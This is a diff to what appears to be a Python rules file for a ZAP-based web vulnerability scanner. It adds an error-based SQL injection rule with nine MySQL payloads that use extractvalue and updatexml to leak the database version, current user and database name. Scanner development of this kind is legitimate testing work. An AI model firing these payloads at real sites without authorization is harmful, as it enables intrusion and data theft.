@@ -1,7 +1,5 @@
 from __future__ import annotations
 
-# time-based SQLi 지연 시간(초). ZAP send_request 내부 timeout을 넘기면 요청이 에러나므로 짧게 유지.
-# 값 변경 시 analyzer/sqli/judge.py 의 SLEEP_THRESHOLD(= _SLEEP - 0.5 권장)도 같이 맞출 것.
 _SLEEP = 3
 
 
@@ -73,6 +71,28 @@ SQLI_RULES: list[dict] = [
                 "{value} ORDER BY 9999-- ",
                 "{value}' ORDER BY 9999-- ",
                 '{value}" ORDER BY 9999-- ',
+            ],
+        },
+    },
+    {
+        "attack_id": "PL-SQLI-ERROR-EXTRACT",
+        "vuln_type": "sqli",
+        "technique": "error_extract",
+        "category": "error",
+        "judgment": "extraction",
+        "extract_marker": "~~",
+        "sequence": ["baseline", "attack"],
+        "payload_templates": {
+            "attack": [
+                "{value} AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
+                "{value}' AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
+                '{value}" AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ',
+                "{value} AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
+                "{value}' AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
+                '{value}" AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ',
+                "{value} AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
+                "{value}' AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
+                '{value}" AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ',
             ],
         },
     },
